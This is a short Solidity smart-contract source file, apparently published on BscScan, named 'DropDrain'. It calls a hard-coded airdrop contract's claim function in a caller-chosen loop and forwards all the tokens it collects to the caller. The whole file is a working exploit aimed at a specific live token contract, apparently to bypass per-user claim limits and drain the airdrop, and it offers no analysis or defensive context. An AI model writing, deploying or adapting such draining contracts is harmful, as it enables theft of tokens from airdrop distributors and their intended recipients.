/**
 *Submitted for verification at BscScan.com on 2021-07-09
*/

pragma solidity ^0.8.0;


interface Airdrop {
    function getAirdrop(address _refer) external returns (bool success);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint256 amount) external returns (bool);
}


contract DropDrain {
    address private constant dropAddr = 0xE4fA857BAF29265da5fFD0231F04525aFcC49Cc2;

    function getAirdrop(uint256 n) public {
        Airdrop ad = Airdrop(dropAddr);
        for (uint256 i = 0; i < n; i++) { ad.getAirdrop(0x0000000000000000000000000000000000000000); }
        IERC20 t = IERC20(dropAddr);
        uint256 bal = t.balanceOf(address(this));
        if (bal > 0) {
            bool ok = t.transfer(msg.sender, bal);
            require(ok, 'can''t transfer()');
        }
    }
}